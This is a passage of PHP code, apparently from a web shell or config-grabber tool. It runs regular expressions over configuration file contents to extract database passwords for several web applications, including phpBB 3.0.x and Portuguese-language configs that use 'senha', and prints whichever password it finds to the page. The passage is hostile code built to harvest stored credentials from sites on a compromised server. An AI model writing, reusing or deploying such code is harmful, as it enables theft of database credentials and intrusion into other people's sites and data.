	preg_match('#password	= \'(.*)\'#',$config,$m6);        		  // connnect.php
	preg_match('#dbpasswd = \'(.*)\'#',$config,$m8);         		  // phpBB 3.0.x
	preg_match('#password_localhost = "(.*)"#',$config,$m9);           // conexao.php
	preg_match('#senha = "(.*)"#',$config,$m10);                       // /_inc/config.inc.php
	echo"<center>";
	if(!empty($m1[1])){ echo $m1[1]."<br>"; }
	elseif(!empty($m2[1])){ echo $m2[1]."<br>"; }
	elseif(!empty($m3[1])){ echo $m3[1]."<br>"; }
	elseif(!empty($m4[1])){ echo $m4[1]."<br>"; }
	elseif(!empty($m5[1])){ echo $m5[1]."<br>"; }
	elseif(!empty($m6[1])){ echo $m6[1]."<br>"; }
	elseif(!empty($m7[1])){ echo $m7[1]."<br>"; }
	elseif(!empty($m8[1])){ echo $m8[1]."<br>"; }
    elseif(!empty($m9[1])){ echo $m9[1]."<br>"; }
	elseif(!empty($m10[1])){ echo $m10[1]."<br>"; }
	echo"</center>";
			}
		} ?>